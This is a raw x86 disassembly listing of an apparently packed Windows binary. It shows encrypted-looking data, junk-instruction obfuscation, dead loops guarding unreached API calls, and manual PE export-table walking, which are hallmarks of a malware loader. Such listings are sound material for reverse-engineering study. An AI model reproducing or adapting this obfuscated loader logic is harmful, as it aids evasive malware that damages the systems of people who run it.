  4046bc:	push   cs
  4046bd:	dec    ebp
  4046be:	jmp    0xef894041
  4046c3:	add    eax,0xca31b594
  4046c8:	sub    al,0x56
  4046ca:	out    dx,eax
  4046cb:	sub    DWORD PTR [ebp+0x18],ecx
  4046ce:	and    BYTE PTR [edi-0x185ab419],dl
  4046d4:	out    dx,eax
  4046d5:	sub    DWORD PTR [ecx],esi
  4046d7:	jp     0x404674
  4046d9:	(bad)  
  4046da:	shl    BYTE PTR [ecx+ecx*1-0x62],1
  4046de:	dec    ecx
  4046df:	std    
  4046e0:	mov    ecx,DWORD PTR [ecx+edi*1]
  4046e3:	icebp  
  4046e4:	ffreep st(5)
  4046e6:	fsub   DWORD PTR [edi-0x3e]
  4046e9:	fst    DWORD PTR [esi+eax*8+0x4ca152e4]
  4046f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046f1:	mov    al,ds:0xf6dad541
  4046f6:	push   ss
  4046f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f8:	pop    ecx
  4046f9:	test   esi,esi
  4046fb:	test   BYTE PTR ds:0x7816bdc4,0x52
  404702:	add    eax,0xd2765e6e
  404707:	loop   0x40473b
  404709:	add    al,0x42
  40470b:	sar    BYTE PTR [esi],0x74
  40470e:	sbb    DWORD PTR [edi],ebx
  404710:	inc    ecx
  404711:	add    DWORD PTR [eax+0x530427c5],0xffffffa3
  404718:	sbb    esi,eax
  40471a:	in     al,dx
  40471b:	xchg   ebx,esi
  40471d:	lods   al,BYTE PTR ds:[esi]
  40471e:	loop   0x4046ca
  404720:	aaa    
  404721:	push   cs
  404722:	lods   al,BYTE PTR ds:[esi]
  404723:	in     al,dx
  404724:	call   0x79c1:0x3a44be92
  40472b:	addr16 jbe 0x4046d2
  40472e:	add    BYTE PTR [edi],bh
  404730:	shr    BYTE PTR [esi+0x76],1
  404733:	pop    ds
  404734:	fwait
  404735:	addr16 mov ch,0x2b
  404738:	inc    edx
  404739:	retf   0x24cb
  40473c:	cli    
  40473d:	jno    0x404704
  40473f:	pushf  
  404740:	jl     0x404726
  404742:	xchg   edx,eax
  404743:	dec    esp
  404744:	hlt    
  404745:	pop    ss
  404746:	inc    esi
  404747:	add    edi,DWORD PTR ds:0xbea6204a
  40474d:	jmp    0x40474b
  40474f:	add    al,0xe3
  404751:	outs   dx,BYTE PTR ds:[esi]
  404752:	mov    ah,0xda
  404754:	fwait
  404755:	je     0x40474b
  404757:	sub    edx,DWORD PTR [ecx+ecx*2+0x52]
  40475b:	sahf   
  40475c:	add    BYTE PTR [ebx-0x5cc3a0f1],ah
  404762:	xor    BYTE PTR [esi+0x73],cl
  404765:	les    ebp,FWORD PTR [edx-0x414e1432]
  40476b:	push   0xabe0d824
  404770:	dec    eax
  404771:	inc    ebx
  404772:	aam    0x5
  404774:	or     al,0xd9
  404776:	mov    al,ds:0x60b550a5
  40477b:	sub    al,0x86
  40477d:	clc    
  40477e:	je     0x4047b8
  404780:	into   
  404781:	push   ds
  404782:	pop    esp
  404783:	sub    DWORD PTR ds:[eax-0x79],ebp
  404787:	mov    ds,WORD PTR [ebx+0x30]
  40478a:	mov    edx,0xdc27e4fb
  40478f:	cmp    DWORD PTR [esi-0x541d9d1a],ebp
  404795:	push   ebx
  404796:	xor    DWORD PTR ss:[eax-0x3a0c2aed],esp
  40479d:	lds    edi,FWORD PTR es:[ebx+ebx*8+0x725e8eec]
  4047a5:	in     al,dx
  4047a6:	(bad)  
  4047a7:	cmc    
  4047a8:	mov    edx,DWORD PTR [edi]
  4047aa:	(bad)  [ebp-0x64]
  4047ad:	(bad)  
  4047ae:	in     al,0xd4
  4047b0:	adc    al,0x97
  4047b2:	mov    ah,0x8f
  4047b4:	xlat   BYTE PTR ds:[ebx]
  4047b5:	(bad)  
  4047b6:	mov    esp,0x5a3ffbd1
  4047bb:	jle    0x40479f
  4047bd:	dec    BYTE PTR [edx]
  4047bf:	xchg   ebx,edi
  4047c1:	dec    esi
  4047c2:	cmp    ch,BYTE PTR [edx]
  4047c4:	pop    ds
  4047c5:	scas   al,BYTE PTR es:[edi]
  4047c6:	ds ret 
  4047c8:	sbb    bh,BYTE PTR [edx+0x30a80238]
  4047ce:	pushf  
  4047cf:	mov    ds,ebp
  4047d1:	jno    0x404772
  4047d3:	xchg   ecx,eax
  4047d4:	rcl    DWORD PTR [ebp-0x35824c26],1
  4047da:	out    dx,eax
  4047db:	fwait
  4047dc:	popf   
  4047dd:	je     0x404855
  4047df:	cli    
  4047e0:	retf   
  4047e1:	lods   al,BYTE PTR ds:[esi]
  4047e2:	inc    ebx
  4047e3:	test   edi,ebp
  4047e5:	idiv   DWORD PTR [eax+esi*2]
  4047e8:	xor    bh,BYTE PTR ds:0xacd1c7ca
  4047ee:	mov    eax,0x9c0ecf30
  4047f3:	mov    edx,0x1690a415
  4047f8:	or     cl,BYTE PTR [eax-0x5f]
  4047fb:	xor    BYTE PTR [edx-0x131886da],ah
  404801:	in     eax,0x94
  404803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404804:	test   BYTE PTR [eax+0x67],al
  404807:	data16 jp 0x4047df
  40480a:	sbb    DWORD PTR [esi-0x530012cf],ecx
  404810:	jnp    0x404795
  404812:	frstor [ecx+0x42]
  404815:	sbb    eax,DWORD PTR [edx+edi*1]
  404818:	and    edi,DWORD PTR [edi-0x33]
  40481b:	test   BYTE PTR [esi],bl
  40481d:	lods   eax,DWORD PTR ds:[esi]
  40481e:	int3   
  40481f:	pushf  
  404820:	inc    esi
  404821:	inc    esp
  404822:	fwait
  404823:	loope  0x4047cc
  404825:	inc    eax
  404826:	inc    ebx
  404827:	add    al,0x55
  404829:	mov    DWORD PTR [ebp-0x62],ebp
  40482c:	cld    
  40482d:	aam    0xfe
  40482f:	sub    BYTE PTR [edx+0x2d],al
  404832:	push   cs
  404833:	jns    0x4047bc
  404835:	fscale 
  404837:	std    
  404838:	mov    al,0xb3
  40483a:	iret   
  40483b:	hlt    
  40483c:	push   ecx
  40483d:	aaa    
  40483e:	fs stos BYTE PTR es:[edi],al
  404840:	shl    DWORD PTR [ebx-0x256b613d],0xec
  404847:	mov    eax,ds:0x97d5293d
  40484c:	dec    eax
  40484d:	jns    0x4048c8
  40484f:	jl     0x404827
  404851:	clc    
  404852:	test   DWORD PTR [esi+0x54],0x8eca8280
  404859:	mov    bh,0x44
  40485b:	inc    esp
  40485c:	and    al,0x34
  40485e:	lods   eax,DWORD PTR ds:[esi]
  40485f:	ror    ebp,1
  404861:	ins    BYTE PTR es:[edi],dx
  404862:	retf   0x8bfd
  404865:	dec    esi
  404866:	push   ebp
  404867:	retf   0xc44e
  40486a:	out    0x4d,al
  40486c:	cmp    edx,esi
  40486e:	and    eax,0x7807417c
  404873:	adc    eax,0x22cf5f02
  404878:	or     eax,0x8ddec8d6
  40487d:	mov    bh,0x8b
  40487f:	inc    esi
  404880:	daa    
  404881:	mov    dl,0xcc
  404883:	loopne 0x404824
  404885:	adc    bl,BYTE PTR [ecx+0x42287852]
  40488b:	imul   esp,DWORD PTR [edx-0x33cc0465],0x10
  404892:	adc    edx,DWORD PTR [ebx+0x78f8bbbf]
  404898:	dec    ebp
  404899:	or     al,0x21
  40489b:	mov    eax,ds:0x8ffb4b01
  4048a0:	and    cl,dh
  4048a2:	mov    edi,0x2fda0f45
  4048a7:	mov    edi,0x8c0aff64
  4048ac:	xchg   edx,eax
  4048ad:	sahf   
  4048ae:	jb     0x404923
  4048b0:	xchg   esi,eax
  4048b1:	xchg   ecx,eax
  4048b2:	and    eax,0x89746260
  4048b7:	(bad)
  4048bb:	push   ds
  4048bc:	lock retf 0x8969
  4048c0:	imul   ecx,DWORD PTR [edi],0xffffff90
  4048c3:	hlt    
  4048c4:	inc    ebp
  4048c5:	es popa 
  4048c7:	and    al,ch
  4048c9:	xchg   esp,eax
  4048ca:	loopne 0x404864
  4048cc:	and    eax,0x3eaba892
  4048d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048d2:	mov    dh,0x1d
  4048d4:	popa   
  4048d5:	shl    DWORD PTR [esi],1
  4048d7:	inc    ebx
  4048d8:	jmp    0x22ee:0x12731263
  4048df:	adc    eax,0x856a215d
  4048e4:	out    dx,eax
  4048e5:	ins    DWORD PTR es:[edi],dx
  4048e6:	into   
  4048e7:	into   
  4048e8:	or     cl,ch
  4048ea:	in     al,dx
  4048eb:	sub    edx,DWORD PTR ds:0x913a93b7
  4048f1:	repz cwde 
  4048f3:	inc    eax
  4048f4:	cmp    edi,DWORD PTR [ebx+ebx*1]
  4048f7:	test   DWORD PTR [ecx-0x45e9812e],eax
  4048fd:	dec    esp
  4048fe:	std    
  4048ff:	sbb    al,0x83
  404901:	rcl    dh,cl
  404903:	xor    DWORD PTR [edx],edi
  404905:	lahf   
  404906:	push   edi
  404907:	inc    edi
  404908:	or     al,0xf3
  40490a:	bound  edx,QWORD PTR [edx]
  40490c:	push   ss
  40490d:	ja     0x40493d
  40490f:	ins    BYTE PTR es:[edi],dx
  404910:	stos   DWORD PTR es:[edi],eax
  404911:	daa    
  404912:	adc    ebx,DWORD PTR [ecx+0x5]
  404915:	test   BYTE PTR [eax],al
  404917:	lds    eax,FWORD PTR [ebx-0x51]
  40491a:	(bad)  [ebp+edi*1+0x1a9e7878]
  404921:	push   esp
  404922:	sub    al,bh
  404924:	lds    ebx,FWORD PTR [edi+0x387b39b1]
  40492a:	jo     0x4048e1
  40492c:	cmp    edi,DWORD PTR [ebx]
  40492e:	inc    esi
  40492f:	mov    eax,ds:0x420b799c
  404934:	(bad)  
  404935:	ret    0xa216
  404938:	xchg   esp,eax
  404939:	mov    al,cl
  40493b:	mov    eax,0x2dfecdde
  404940:	jns    0x404967
  404942:	call   0x3334a459
  404947:	cld    
  404948:	jg     0x40491d
  40494a:	add    eax,0x20ce8386
  40494f:	cdq    
  404950:	rcr    DWORD PTR [esi+0x19],0x9a
  404954:	fld    TBYTE PTR [ebx+0x75]
  404957:	inc    ebx
  404958:	loope  0x4048f5
  40495a:	mov    esp,0x7077fa4c
  40495f:	jb     0x40490d
  404961:	mov    cl,0x6f
  404963:	fist   WORD PTR [ebp+0x14f9ff8]
  404969:	push   es
  40496a:	adc    al,0xac
  40496c:	imul   ecx,DWORD PTR [edx-0x247c1c9f],0xffffff8e
  404973:	(bad)  
  404974:	jbe    0x4049f1
  404976:	sub    eax,edx
  404978:	aaa    
  404979:	pushf  
  40497a:	jl     0x404937
  40497c:	mov    cl,BYTE PTR [edx-0x37292d5]
  404982:	push   ebp
  404983:	pop    esi
  404984:	ins    DWORD PTR es:[edi],dx
  404985:	nop
  404986:	and    DWORD PTR [ecx+eiz*4-0xa52d615],edx
  40498d:	shr    DWORD PTR [esi-0x6e674e0e],0xac
  404994:	mov    al,0x82
  404996:	push   esi
  404997:	or     esi,0x64f0
  40499d:	mov    edx,0x751089b
  4049a2:	add    DWORD PTR ds:0x435018,0x3361
  4049ac:	xor    ecx,edx
  4049ae:	and    DWORD PTR ds:0x435010,0x0
  4049b8:	xor    esi,esi
  4049ba:	or     esi,DWORD PTR ds:0x435010
  4049c0:	inc    esi
  4049c1:	mov    DWORD PTR ds:0x435010,esi
  4049c7:	cmp    DWORD PTR ds:0x435010,0xb
  4049ce:	jl     0x404a0b
  4049d4:	jmp    0x4049e4
  4049d9:	push   0x1955
  4049de:	call   DWORD PTR ds:0x43a8c4
  4049e4:	cmp    DWORD PTR ds:0x435010,0xa
  4049eb:	jne    0x4049fe
  4049f1:	mov    esi,DWORD PTR ds:0x435010
  4049f7:	inc    esi
  4049f8:	mov    DWORD PTR ds:0x435010,esi
  4049fe:	cmp    DWORD PTR ds:0x435010,0x1c
  404a05:	jb     0x4049b8
  404a0b:	mov    esi,0x3272e2
  404a10:	or     DWORD PTR ds:0x436018,0x436014
  404a1a:	push   edi
  404a1b:	add    edi,DWORD PTR ds:0x43800c
  404a21:	mov    edi,DWORD PTR [ebp+0x10]
  404a24:	add    ecx,esi
  404a26:	mov    DWORD PTR ds:0x43500c,0x38f3
  404a30:	cmp    ecx,edi
  404a32:	mov    DWORD PTR ds:0x43401c,0x3286
  404a3c:	je     0x404b8f
  404a42:	mov    ecx,DWORD PTR [ebp-0x4]
  404a45:	sbb    edi,DWORD PTR ds:0x435014
  404a4b:	mov    edi,DWORD PTR [ebp+0x10]
  404a4e:	xor    eax,eax
  404a50:	xor    DWORD PTR ds:0x435018,0x434028
  404a5a:	xor    ecx,edx
  404a5c:	add    ecx,esi
  404a5e:	mov    DWORD PTR ds:0x434024,0x7740
  404a68:	add    edi,0xfabdbee7
  404a6e:	adc    eax,0xffffffff
  404a71:	inc    DWORD PTR ds:0x437010
  404a77:	xor    eax,0x0
  404a7a:	or     DWORD PTR ds:0x438008,0x434024
  404a84:	mov    DWORD PTR [ebp-0xc],eax
  404a87:	push   ebx
  404a88:	xor    ebx,ebx
  404a8a:	adc    DWORD PTR ds:0x43400c,0x682
  404a94:	xor    edi,0x8a29a12d
  404a9a:	mov    DWORD PTR ds:0x436008,0x12
  404aa4:	cmp    DWORD PTR ds:0x436008,0x0
  404aab:	je     0x404af4
  404ab1:	cmp    DWORD PTR ds:0x436008,0x3
  404ab8:	jle    0x404af4
  404abe:	jmp    0x404acc
  404ac3:	push   DWORD PTR [ebp-0x18]
  404ac6:	call   DWORD PTR ds:0x43a8c8
  404acc:	cmp    DWORD PTR ds:0x436008,0x4
  404ad3:	jne    0x404ae4
  404ad9:	mov    eax,ds:0x436008
  404ade:	dec    eax
  404adf:	mov    ds:0x436008,eax
  404ae4:	mov    eax,ds:0x436008
  404ae9:	dec    eax
  404aea:	mov    ds:0x436008,eax
  404aef:	jmp    0x404aa4
  404af4:	mov    eax,ecx
  404af6:	add    eax,0xfabdbee7
  404afb:	adc    ebx,0xffffffff
  404afe:	xor    eax,0x8a29a12d
  404b03:	xor    ebx,0x0
  404b06:	cmp    eax,edi
  404b08:	jne    0x404b21
  404b0e:	cmp    ebx,DWORD PTR [ebp-0xc]
  404b11:	je     0x404b89
  404b17:	jmp    0x404b21
  404b1c:	mov    esi,0x3272e2
  404b21:	mov    eax,DWORD PTR [ebp-0x4]
  404b24:	mov    edi,DWORD PTR [ebp-0x8]
  404b27:	xor    edi,edx
  404b29:	add    edi,esi
  404b2b:	mov    esi,DWORD PTR [ebp+0x8]
  404b2e:	imul   edi,ecx
  404b31:	mov    ebx,DWORD PTR [ebp+0xc]
  404b34:	xor    eax,edx
  404b36:	add    eax,ecx
  404b38:	mov    al,BYTE PTR [ebx+eax*1+0x3272e2]
  404b3f:	mov    BYTE PTR [edi+esi*1],al
  404b42:	mov    eax,DWORD PTR [ebp-0x8]
  404b45:	mov    esi,DWORD PTR [ebp+0x10]
  404b48:	xor    eax,edx
  404b4a:	xor    ebx,ebx
  404b4c:	add    esi,0xfabdbee7
  404b52:	adc    ebx,0xffffffff
  404b55:	lea    ecx,[ecx+eax*1+0x3272e2]
  404b5c:	xor    edi,edi
  404b5e:	xor    esi,0x8a29a12d
  404b64:	xor    ebx,0x0
  404b67:	mov    eax,ecx
  404b69:	add    eax,0xfabdbee7
  404b6e:	adc    edi,0xffffffff
  404b71:	xor    eax,0x8a29a12d
  404b76:	xor    edi,0x0
  404b79:	cmp    eax,esi
  404b7b:	jne    0x404b1c
  404b81:	cmp    edi,ebx
  404b83:	jne    0x404b1c
  404b89:	mov    eax,0xf89c8584
  404b8e:	pop    ebx
  404b8f:	pop    edi
  404b90:	pop    esi
  404b91:	leave  
  404b92:	ret    0xc
  404b95:	push   ebp
  404b96:	mov    ebp,esp
  404b98:	push   ecx
  404b99:	add    DWORD PTR ds:0x43701c,0x56ef
  404ba3:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404baa:	mov    eax,DWORD PTR [ebp+0x8]
  404bad:	movsx  eax,BYTE PTR [eax]
  404bb0:	and    DWORD PTR ds:0x436004,0x0
  404bba:	mov    ecx,DWORD PTR ds:0x436004
  404bc0:	inc    ecx
  404bc1:	mov    DWORD PTR ds:0x436004,ecx
  404bc7:	cmp    DWORD PTR ds:0x436004,0x6
  404bce:	ja     0x404c0b
  404bd4:	jmp    0x404be4
  404bd9:	push   0x43a0c9
  404bde:	call   DWORD PTR ds:0x43a8d0
  404be4:	cmp    DWORD PTR ds:0x436004,0x5
  404beb:	jne    0x404bfe
  404bf1:	mov    ecx,DWORD PTR ds:0x436004
  404bf7:	inc    ecx
  404bf8:	mov    DWORD PTR ds:0x436004,ecx
  404bfe:	cmp    DWORD PTR ds:0x436004,0x18
  404c05:	jb     0x404bba
  404c0b:	mov    edx,0x3272e2
  404c10:	neg    ecx
  404c12:	sub    eax,edx
  404c14:	mov    ecx,0x751089b
  404c19:	xor    eax,ecx
  404c1b:	mov    DWORD PTR ds:0x43600c,0x18ff
  404c25:	cmp    eax,0xf89c85f0
  404c2a:	jne    0x404c59
  404c30:	mov    eax,DWORD PTR [ebp+0x8]
  404c33:	push   esi
  404c34:	mov    esi,DWORD PTR [ebp+0x8]
  404c37:	add    esi,DWORD PTR [eax+0x3c]
  404c3a:	mov    DWORD PTR [ebp+0x8],esi
  404c3d:	mov    eax,DWORD PTR [ebp-0x4]
  404c40:	mov    esi,DWORD PTR [ebp+0x8]
  404c43:	xor    eax,ecx
  404c45:	add    eax,edx
  404c47:	cmp    DWORD PTR [esi+0x54],eax
  404c4a:	pop    esi
  404c4b:	je     0x404c59
  404c51:	mov    eax,DWORD PTR [ebp+0x8]
  404c54:	jmp    0x404c60
  404c59:	mov    eax,DWORD PTR [ebp-0x4]
  404c5c:	xor    eax,ecx
  404c5e:	add    eax,edx
  404c60:	leave  
  404c61:	ret    0x4
  404c64:	push   ebp
  404c65:	mov    ebp,esp
  404c67:	sub    esp,0x38
  404c6a:	or     DWORD PTR ds:0x43500c,0x434024
  404c74:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404c7b:	mov    eax,ds:0x437004
  404c80:	or     DWORD PTR ds:0x434004,eax
  404c86:	push   ebx
  404c87:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  404c8e:	adc    DWORD PTR ds:0x434020,edi
  404c94:	mov    eax,DWORD PTR [ebp-0x4]
  404c97:	xor    DWORD PTR ds:0x437018,0x773f
  404ca1:	push   esi
  404ca2:	xor    DWORD PTR ds:0x435010,0x4a66
  404cac:	mov    esi,0x751089b
  404cb1:	and    DWORD PTR ds:0x435018,0x354c
  404cbb:	xor    eax,esi
  404cbd:	not    DWORD PTR ds:0x436018
  404cc3:	push   edi
  404cc4:	mov    edi,0x3272e2
  404cc9:	add    eax,edi
  404ccb:	xor    DWORD PTR ds:0x434018,0x434000
  404cd5:	mov    DWORD PTR [ebp-0x1c],eax
  404cd8:	and    DWORD PTR ds:0x438010,0x0
  404ce2:	mov    eax,ds:0x438010
  404ce7:	inc    eax
  404ce8:	mov    ds:0x438010,eax
  404ced:	cmp    DWORD PTR ds:0x438010,0xb
  404cf4:	jb     0x404d2f
  404cfa:	jmp    0x404d0a
  404cff:	push   0x43a097
  404d04:	call   DWORD PTR ds:0x43a8d4
  404d0a:	cmp    DWORD PTR ds:0x438010,0xa
  404d11:	jne    0x404d22
  404d17:	mov    eax,ds:0x438010
  404d1c:	inc    eax
  404d1d:	mov    ds:0x438010,eax
  404d22:	cmp    DWORD PTR ds:0x438010,0x14
  404d29:	jb     0x404ce2
  404d2f:	mov    eax,DWORD PTR [ebp+0x14]
  404d32:	sbb    DWORD PTR ds:0x437008,0x2430
  404d3c:	test   eax,eax
  404d3e:	je     0x404d99
  404d44:	and    DWORD PTR ds:0x438000,edx
  404d4a:	mov    eax,DWORD PTR [ebp+0x14]
  404d4d:	and    DWORD PTR ds:0x435014,0x0
  404d57:	xor    ebx,ebx
  404d59:	add    ebx,DWORD PTR ds:0x435014
  404d5f:	inc    ebx
  404d60:	mov    DWORD PTR ds:0x435014,ebx
  404d66:	cmp    DWORD PTR ds:0x435014,0x29
  404d6d:	jl     0x404d8e
  404d73:	jmp    0x404d81
  404d78:	push   DWORD PTR [ebp-0x24]
  404d7b:	call   DWORD PTR ds:0x43a8dc
  404d81:	cmp    DWORD PTR ds:0x435014,0x1a
  404d88:	jb     0x404d57
  404d8e:	mov    eax,DWORD PTR [eax]
  404d90:	or     ebx,DWORD PTR ds:0x438014
  404d96:	mov    DWORD PTR [ebp-0x1c],eax
  404d99:	or     DWORD PTR ds:0x436008,0x1828
  404da3:	mov    eax,DWORD PTR [ebp-0x4]
  404da6:	adc    DWORD PTR ds:0x437014,edi
  404dac:	xor    eax,esi
  404dae:	xor    ebx,ebx
  404db0:	or     ebx,DWORD PTR ds:0x436018
  404db6:	xor    DWORD PTR ds:0x434004,ebx
  404dbc:	add    eax,edi
  404dbe:	mov    DWORD PTR [ebp-0x8],eax
  404dc1:	add    DWORD PTR ds:0x43601c,0x710e
  404dcb:	mov    eax,DWORD PTR [ebp-0xc]
  404dce:	xor    ebx,ebx
  404dd0:	add    ebx,DWORD PTR ds:0x438008
  404dd6:	and    DWORD PTR ds:0x438018,ebx
  404ddc:	xor    eax,esi
  404dde:	and    DWORD PTR ds:0x438010,0x0
  404de8:	xor    ebx,ebx
  404dea:	add    ebx,DWORD PTR ds:0x438010
  404df0:	inc    ebx
  404df1:	mov    DWORD PTR ds:0x438010,ebx
  404df7:	cmp    DWORD PTR ds:0x438010,0x29
  404dfe:	jg     0x404e2c
  404e04:	jmp    0x404e1f
  404e09:	push   0x43a097
  404e0e:	push   DWORD PTR [ebp-0x24]
  404e11:	push   0x5041
  404e16:	push   DWORD PTR [ebp-0x1c]
  404e19:	call   DWORD PTR ds:0x43a8e0
  404e1f:	cmp    DWORD PTR ds:0x438010,0x1d
  404e26:	jb     0x404de8
  404e2c:	add    eax,edi
  404e2e:	movzx  ebx,WORD PTR ds:0x434018
  404e35:	sbb    ebx,DWORD PTR ds:0x434000
  404e3b:	mov    DWORD PTR ds:0x434018,ebx
  404e41:	mov    DWORD PTR [ebp-0x24],eax
  404e44:	mov    eax,DWORD PTR [ebp-0x4]
  404e47:	and    DWORD PTR ds:0x437004,edx
  404e4d:	xor    eax,esi
  404e4f:	add    eax,edi
  404e51:	add    DWORD PTR ds:0x43600c,0x546e
  404e5b:	mov    DWORD PTR [ebp-0x30],eax
  404e5e:	sub    eax,ebx
  404e60:	mov    ebx,DWORD PTR [ebp-0x4]
  404e63:	sub    DWORD PTR ds:0x435008,0x4ecf
  404e6d:	xor    ebx,esi
  404e6f:	sub    DWORD PTR ds:0x436004,edx
  404e75:	add    ebx,edi
  404e77:	adc    DWORD PTR ds:0x438000,0x4ed2
  404e81:	mov    eax,DWORD PTR [ebp-0x24]
  404e84:	xor    DWORD PTR ds:0x435018,0x43700c
  404e8e:	sub    eax,edi
  404e90:	lea    ecx,[ebx-0x3272e2]
  404e96:	xor    eax,esi
  404e98:	adc    DWORD PTR ds:0x436010,0x436014
  404ea2:	xor    ecx,esi
  404ea4:	mov    DWORD PTR ds:0x438004,0x37e0
  404eae:	cmp    ecx,eax
  404eb0:	mov    DWORD PTR ds:0x437000,0x70b7
  404eba:	je     0x4051ec
  404ec0:	and    DWORD PTR ds:0x43701c,0x0
  404eca:	xor    eax,eax
  404ecc:	or     eax,DWORD PTR ds:0x43701c
  404ed2:	inc    eax
  404ed3:	mov    ds:0x43701c,eax
  404ed8:	cmp    DWORD PTR ds:0x43701c,0x6
  404edf:	ja     0x404f2d
  404ee5:	jmp    0x404f08
  404eea:	push   DWORD PTR [ebp-0xc]
  404eed:	push   0x434024
  404ef2:	push   DWORD PTR [ebp-0x10]
  404ef5:	push   0x43a000
  404efa:	push   0x794f
  404eff:	push   DWORD PTR [ebp-0x28]
  404f02:	call   DWORD PTR ds:0x43a8e4
  404f08:	cmp    DWORD PTR ds:0x43701c,0x5
  404f0f:	jne    0x404f20
  404f15:	mov    eax,ds:0x43701c
  404f1a:	inc    eax
  404f1b:	mov    ds:0x43701c,eax
  404f20:	cmp    DWORD PTR ds:0x43701c,0x10
  404f27:	jb     0x404eca
  404f2d:	mov    eax,DWORD PTR [ebp-0x4]
  404f30:	xor    eax,esi
  404f32:	sub    DWORD PTR ds:0x435000,0x434020
  404f3c:	add    eax,edi
  404f3e:	cmp    ebx,eax
  404f40:	jne    0x4051c9
  404f46:	adc    DWORD PTR ds:0x437008,0x435000
  404f50:	push   DWORD PTR [ebp+0x8]
  404f53:	adc    DWORD PTR ds:0x43600c,0x30f1
  404f5d:	call   0x404b95
  404f62:	mov    ecx,DWORD PTR ds:0x437010
  404f68:	sub    DWORD PTR ds:0x434024,ecx
  404f6e:	mov    DWORD PTR [ebp-0x14],eax
  404f71:	and    DWORD PTR ds:0x437014,0x0
  404f7b:	mov    eax,ds:0x437014
  404f80:	inc    eax
  404f81:	mov    ds:0x437014,eax
  404f86:	cmp    DWORD PTR ds:0x437014,0x5
  404f8d:	jl     0x404fd1
  404f93:	jmp    0x404fac
  404f98:	push   DWORD PTR [ebp-0x1c]
  404f9b:	push   0x89c7
  404fa0:	push   DWORD PTR [ebp-0x20]
  404fa3:	push   DWORD PTR [ebp-0x28]
  404fa6:	call   DWORD PTR ds:0x43a8e8
  404fac:	cmp    DWORD PTR ds:0x437014,0x4
  404fb3:	jne    0x404fc4
  404fb9:	mov    eax,ds:0x437014
  404fbe:	inc    eax
  404fbf:	mov    ds:0x437014,eax
  404fc4:	cmp    DWORD PTR ds:0x437014,0x1b
  404fcb:	jb     0x404f7b
  404fd1:	mov    eax,DWORD PTR [ebp-0x4]
  404fd4:	add    ecx,0x29bc
  404fda:	mov    ecx,DWORD PTR [ebp-0x14]
  404fdd:	or     DWORD PTR ds:0x43401c,0x7fb4
  404fe7:	xor    eax,esi
  404fe9:	add    eax,edi
  404feb:	cmp    ecx,eax
  404fed:	je     0x405257
  404ff3:	push   DWORD PTR [ebp-0x14]
  404ff6:	and    DWORD PTR ds:0x438000,0x39ab
  405000:	push   DWORD PTR [ebp+0x8]
  405003:	xor    DWORD PTR ds:0x437010,0x438000
  40500d:	call   0x40a3b2
  405012:	sbb    DWORD PTR ds:0x438014,0x3483
  40501c:	mov    DWORD PTR [ebp-0x14],eax
  40501f:	or     ecx,0x551e
  405025:	mov    eax,DWORD PTR [ebp-0x4]
  405028:	mov    ecx,DWORD PTR ds:0x434010
  40502e:	or     DWORD PTR ds:0x437014,ecx
  405034:	mov    ecx,DWORD PTR [ebp-0x14]
  405037:	sub    DWORD PTR ds:0x43801c,0xa60
  405041:	xor    eax,esi
  405043:	add    eax,edi
  405045:	mov    DWORD PTR ds:0x435004,0x1802
  40504f:	cmp    ecx,eax
  405051:	je     0x405257
  405057:	mov    DWORD PTR ds:0x43701c,0x15
  405061:	cmp    DWORD PTR ds:0x43701c,0x0
  405068:	je     0x4050b4
  40506e:	cmp    DWORD PTR ds:0x43701c,0xa
  405075:	jb     0x4050b4
  40507b:	jmp    0x405086
  405080:	call   DWORD PTR ds:0x43a8f0
  405086:	cmp    DWORD PTR ds:0x43701c,0xb
  40508d:	jne    0x4050a0
  405093:	mov    ecx,DWORD PTR ds:0x43701c
  405099:	dec    ecx
  40509a:	mov    DWORD PTR ds:0x43701c,ecx
  4050a0:	xor    ecx,ecx
  4050a2:	or     ecx,DWORD PTR ds:0x43701c
  4050a8:	dec    ecx
  4050a9:	mov    DWORD PTR ds:0x43701c,ecx
  4050af:	jmp    0x405061
  4050b4:	mov    eax,DWORD PTR [ebp-0x14]
  4050b7:	sub    DWORD PTR ds:0x436010,edi
  4050bd:	mov    eax,DWORD PTR [eax+0x18]
  4050c0:	adc    DWORD PTR ds:0x436000,ebx
  4050c6:	mov    DWORD PTR [ebp-0x24],eax
  4050c9:	mov    DWORD PTR ds:0x434028,0x1f
  4050d3:	cmp    DWORD PTR ds:0x434028,0x0
  4050da:	je     0x40510b
  4050e0:	cmp    DWORD PTR ds:0x434028,0x27
  4050e7:	jl     0x40510b
  4050ed:	jmp    0x4050fb
  4050f2:	push   DWORD PTR [ebp-0x14]
  4050f5:	call   DWORD PTR ds:0x43a8f4
  4050fb:	mov    eax,ds:0x434028
  405100:	dec    eax
  405101:	mov    ds:0x434028,eax
  405106:	jmp    0x4050d3
  40510b:	mov    eax,DWORD PTR [ebp-0x14]
  40510e:	or     ecx,0x2a6b
  405114:	mov    ecx,DWORD PTR [ebp+0x8]
  405117:	xor    DWORD PTR ds:0x438000,0x69f8
  405121:	add    ecx,DWORD PTR [eax+0x20]
  405124:	sbb    DWORD PTR ds:0x436014,0x3915
  40512e:	mov    DWORD PTR [ebp-0x2c],ecx
  405131:	mov    eax,DWORD PTR [ebp-0x14]
  405134:	mov    ecx,DWORD PTR ds:0x43700c
  40513a:	xor    DWORD PTR ds:0x434008,ecx
  405140:	mov    ecx,DWORD PTR [ebp+0x8]
  405143:	add    ecx,DWORD PTR [eax+0x24]
  405146:	xor    eax,eax
  405148:	add    eax,DWORD PTR ds:0x434008
  40514e:	xor    DWORD PTR ds:0x437014,eax
  405154:	mov    DWORD PTR [ebp-0x34],ecx
  405157:	mov    DWORD PTR ds:0x438000,0x1b
  405161:	cmp    DWORD PTR ds:0x438000,0x0
  405168:	je     0x4051b8
  40516e:	cmp    DWORD PTR ds:0x438000,0x3
  405175:	jbe    0x4051b8
  40517b:	jmp    0x40518c
  405180:	push   DWORD PTR [ebp-0x28]
  405183:	push   DWORD PTR [ebp-0xc]
  405186:	call   DWORD PTR ds:0x43a8f8
  40518c:	cmp    DWORD PTR ds:0x438000,0x4
  405193:	jne    0x4051a6
  405199:	mov    ecx,DWORD PTR ds:0x438000
  40519f:	dec    ecx
  4051a0:	mov    DWORD PTR ds:0x438000,ecx
  4051a6:	mov    ecx,DWORD PTR ds:0x438000
